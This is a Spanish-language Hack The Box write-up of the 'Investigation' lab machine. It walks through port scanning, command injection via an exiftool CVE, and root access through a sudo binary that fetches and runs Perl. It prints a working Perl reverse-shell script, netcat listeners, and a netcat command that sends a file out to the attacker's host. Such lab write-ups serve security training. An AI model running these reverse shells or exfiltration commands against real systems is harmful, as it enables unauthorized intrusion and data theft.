---
layout: post
author: 4akatun
---

# Writeup

![Investigation0]({{'assets/img/Investigation/investigation.png' | relative_url}})

HACK-THE-BOX

-----------------------------------------------------------------

Iniciamos el reconocimineto de puertos a la maquina victima con **Nmap**
para ver puertos abiertos y servicios que los ocupan.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.197
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 22:04 CET
Initiating SYN Stealth Scan at 22:04
Scanning 10.10.11.197 [65535 ports]
Discovered open port 80/tcp on 10.10.11.197
Discovered open port 22/tcp on 10.10.11.197
Completed SYN Stealth Scan at 22:05, 13.55s elapsed (65535 total ports)
Nmap scan report for 10.10.11.197
Host is up, received user-set (0.068s latency).
Scanned at 2023-03-02 22:04:49 CET for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
❯ nmap -sCV -p22,80 10.10.11.197
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 22:05 CET
Nmap scan report for eforenzics.htb (10.10.11.197)
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: eForenzics - Premier Digital Forensics
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Viendo el puerto *80* lanzo **whatweb** para ver los servcios y plugins que contiene la web

```bash
❯ whatweb 10.10.11.197
http://10.10.11.197 [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.197], RedirectLocation[http://eforenzics.htb/], Title[301 Moved Permanently]
http://eforenzics.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.197], JQuery[3.4.1], Meta-Author[eForenzics], Script, Title[eForenzics - Premier Digital Forensics], UncommonHeaders[upgrade]
```
Debemos introducir el nombre de dominio **eforenzics.htb** en **/etc/hosts** para que podamos ver la pagina, ya que al poner la ip nos redirige al dicho dominio.
Luego de ver un poco me encuentro con esta parte.

![upload]({{'assets/img/Investigation/upload_web.png' | relative_url}})

Subimos cualquier archivo de imagen para investigar y ver donde nos lleva.

Puedo ver que lo que hace es analizar la foto con **exiftool** y ve la version,
investigando un poco pudeo ver que la version tiene una vulnerabilidad. 

![exiftool]({{'assets/img/Investigation/exiftool.png' | relative_url}})

Encuentro esta pagina [CVE-2022-23935.md](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) donde puedo ver informacion
y como se puede abusar y tener ejecucion remota de comandos.

Lo compruebo y trabajando desde ***BurpSuite*** empiezo a probar.
Lanzo primero un *ping* a mi maquina que esta en escucha con **tcpdump**
para comprobar que efectivamente tengo ejecucion remota de comandos.

![ping]({{'assets/img/Investigation/ping.png' | relative_url}})

Funciona, hora de ejecutar una **reverse-shell** y acceder a la maquina.

```bash
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:15:49.053723 IP (tos 0x0, ttl 63, id 19299, offset 0, flags [DF], proto ICMP (1), length 84)
    eforenzics.htb > 10.10.14.25: ICMP echo request, id 2, seq 1, length 64
22:15:49.053745 IP (tos 0x0, ttl 64, id 58891, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.25 > eforenzics.htb: ICMP echo reply, id 2, seq 1, length 64
```
Para ello creamos una linea de comandos de reversing en *bash* y lo mandamos en **base 64**

![reverse]({{'assets/img/Investigation/reverse.png' | relative_url}})

Conseguimos acceso a la maquina como **www-data**, hacemos tratamiento da la *tty*
***Tratamiento  tty***
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.197] 60144
sh: 0: can't access tty; job control turned off

$ script /dev/null -c bash
Script started, file is /dev/null
www-data@investigation:~/uploads/1677794786$ ^Z
zsh: suspended  nc -nlvp 443

❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm

www-data@investigation:~/uploads/1677794786$ 
```
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.197] 51368
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```
Buscando encuentro esta ruta con un archivo interesante **.msg**, que corresponde a 
archivos de mensajes de correo **outlook**.

```bash
www-data@investigation:/usr/local/investigation$ ls
'Windows Event Logs for Analysis.msg'   analysed_log
www-data@investigation:/usr/local/investigation$
```
Lo tranfiero a mi maquina para poder analizarlo y ver que contiene.

```bash
❯ nc -nlvp 1234 >  Windows\ Event\ Logs\ for\ Analysis.msg
listening on [any] 1234 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.197] 58518
```
```bash
www-data@investigation:/usr/local/investigation$ nc 10.10.14.25 1234 < Windows\ Event\ Logs\ for\ Analysis.msg 
```
Para abrirlo utilizo el siguiente suitio web.
[MSG-READER](https://products.aspose.app/email/viewer/msg)

![.msg]({{'assets/img/Investigation/Windows-logs.png' | relative_url}})

Veo un mensaje y boton de descarga pero no puedo descargarlo.
Busco y en el siguiente enlace [encryptomatic](https://www.encryptomatic.com/viewer/) obtengo resultados.

![descarga-zip]({{'assets/img/Investigation/descarga-zip.png' | relative_url}})

Lo descargo y veo que contiene un archivo de registro de logs de *Windows*

```bash
❯ unzip -l evtx-logs.zip
Archive:  evtx-logs.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 15798272  2022-08-01 13:36   security.evtx
---------                     -------
 15798272                     1 file
```
Con la siguiente erramienta vuelco su contenido en otro archivo legible y poder ver que hay.

```bash
❯ evtxexport security.evtx > security.dump
```
![ssh-key]({{'assets/img/Investigation/ssh-key.png' | relative_url}})

Despues de mucho buscar veo lo que puede ser una contraseña.
La pruebo con el usuario *smorton* por *ssh*

```bash
❯ ssh smorton@10.10.11.197
smorton@10.10.11.197's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 02 Mar 2023 09:52:58 PM UTC

  System load:  0.0               Processes:             226
  Usage of /:   59.4% of 3.97GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.197
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

smorton@investigation:~$ whoami
smorton
smorton@investigation:~$ ls
user.txt
smorton@investigation:~$ cat user.txt 
aa4**************************e3b
smorton@investigation:~$ 
```
Funciona, estoy dentro de la maquina y ya puedo observar la *flag* de bajos privilegios.
Continuo investigando para poder escalar privilegios como *root*

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$ 
```
Encuantro que, puedo ejecutar como *root* sin proporcionar ninguna contraseña el archivo de nombre *binary*
Me lo descargo a mi maquina para analizarlo mas en profundidad y ver si pude tener vulnerabilidades.

![binary]({{'assets/img/Investigation/binary_analyze.png' | relative_url}})

En primer lugar, comprueba si se han enviado tres parámetros de entrada "dos porque el primer parámetro es el nombre del programa mismo".
En segundo lugar, comprueba si un usuario root lo llama.
En tercer lugar, comprueba si el tercer parámetro es igual al texto **lDnxUysaQn**.
En cuarto lugar, abre un archivo con **curl** que se especifica mediante el segundo parámetro y lee y se ejecuta con perl.
Y se puede ver que la máquina enviaría la solicitud de obtención a la URL especificada. 


```bash
smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.25:443 lDnxUysaQn
Running... 
```
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.197] 38380
GET / HTTP/1.1
Host: 10.10.14.25:443
Accept: */*
```
Voy a alojar un archivo en *perl* con un **reverse-shell**

```perl
 use Socket;
 $i="10.10.14.25";
 $p=443;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){
   open(STDIN,">&S");open(STDOUT,">&S");
   open(STDERR,">&S");exec("/bin/bash -i");
 };
```

Monto un servor **http** con **python3** y vuelvo a ejecutar apuntando a mi archivo **perl**

```bash
smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.25/rever.pl lDnxUysaQn
```
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.197 - - [02/Mar/2023 22:59:44] "GET /rever.pl HTTP/1.1" 200 -
```
Y conseguimos tener la **reverse-shell** como **root**
Visualizar la *flag*.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.197] 46488
root@investigation:/home/smorton# whoami
whoami
root
root@investigation:/home/smorton# cat /root/root.txt
cat /root/root.txt
12c**************************ab3
root@investigation:/home/smorton# 
```

# Espro que te pueda servir de ayuda. *GRACIAS por venir*
